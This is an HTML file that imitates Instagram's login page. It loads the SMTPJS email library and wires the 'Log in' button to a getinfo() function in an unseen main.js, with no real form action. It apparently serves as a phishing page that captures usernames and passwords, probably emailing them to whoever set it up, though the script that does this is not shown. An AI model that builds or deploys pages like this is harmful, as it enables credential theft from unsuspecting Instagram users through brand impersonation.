<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Instagram login Form</title>
    
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" >
    <link rel="stylesheet" href="main.css">
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script src="main.js"></script>

</head>
<body>
    <div id="wrapper">
      <div class="container">
        <div class="phone-app-demo"></div>
        <div class="form-data">
          <form action="">
            <div class="logo">
              <h1>Instagram.</h1>
            </div>
            <input id="username" type="text" placeholder="Phone number, username, or email" >
            <input  id="password" type="text" placeholder="Password" >
            <button class="form-btn" type="submit" onclick="getinfo()">Log in</button>
            <span class="has-separator">Or</span>
            <a href="#" class="facebook-login">
              <i class="fab fa-facebook"></i> Log in with Facebook
            </a>
            <a class="password-reset" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
          </form>
          <div class="sign-up">
            Don't an account? <a href="https://www.instagram.com/accounts/emailsignup">Sign up</a>
          </div>
          <div class="get-the-app">
            <span>Get the app</span>
            <div class="badge">
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="android App">
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="ios app">
            </div>
          </div>
        </div>
      </div>

      <footer>
        <div class="container">
          <nav class="footer-nav">
            <ul>
              <li><a href="#">About Us</a></li>
              <li><a href="#">Support</a></li>
              <li><a href="#">Jobs</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Profiles</a></li>
              <li><a href="#">Languages</a></li>
            </ul>
          </nav>
          <div class="copyright-notice">
            &copy; 2021 Complaints
          </div>
        </div>
      </footer>
    </div>
</body>
</html>
